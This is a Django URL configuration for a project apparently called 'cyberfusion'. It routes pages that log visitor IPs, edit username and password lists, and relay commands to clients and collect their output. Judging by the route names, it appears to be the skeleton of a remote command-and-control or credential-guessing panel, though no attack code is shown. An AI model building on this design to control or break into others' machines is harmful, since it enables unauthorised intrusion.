from django.urls import path
from . import views
urlpatterns = [
    path('cyberfusion/', views.index,name='index'),
    path('get_ip/', views.get_ip),
    path('', views.save_ip),
    path('faq/', views.faq),
    path('editor-usernames/', views.editor1, name="usernames"),
    path('editor-passwords/', views.editor2, name='passwords'),
    path('get_command/', views.get_command, name='get_command'),
    path('save_command/', views.save_command),
    path('send_output/', views.send_output, name='send_output'),
    path('get_output/', views.get_output),
]
